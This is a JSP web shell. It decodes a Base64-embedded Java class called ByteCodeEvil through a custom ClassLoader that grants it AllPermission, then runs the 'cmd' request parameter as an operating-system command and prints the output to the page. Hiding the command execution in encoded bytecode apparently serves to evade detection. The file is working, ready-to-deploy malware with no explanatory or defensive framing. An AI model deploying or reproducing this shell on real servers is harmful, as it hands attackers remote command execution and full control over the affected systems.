<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.security.*" %>
<%@ page pageEncoding="GB2312" %>
<%
    ClassLoader loader = new ClassLoader() {
        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if(name.contains("ByteCodeEvil")){
                return findClass(name);
            }
            return super.loadClass(name);
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            try {
                byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=");
                PermissionCollection pc = new Permissions();
                pc.add(new AllPermission());
                ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);
                return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
    };

    String cmd = request.getParameter("cmd");
    Class<?> clazz = loader.loadClass("com.Evil.ByteCodeEvil");
    Constructor<?> constructor = clazz.getConstructor(String.class);
    Object result = constructor.newInstance(cmd).toString();
    response.getWriter().print("<pre>");
    response.getWriter().print(result.toString());
    response.getWriter().print("<pre>");
%>